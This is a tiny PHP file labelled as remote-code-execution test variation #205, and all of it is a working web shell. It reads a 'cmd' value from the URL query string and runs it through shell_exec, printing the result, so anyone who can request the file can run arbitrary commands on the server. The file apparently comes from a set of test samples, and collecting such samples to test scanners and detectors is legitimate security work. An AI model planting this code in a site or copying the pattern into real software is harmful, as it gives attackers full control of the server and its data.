<?php
// RCE test variation #205
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>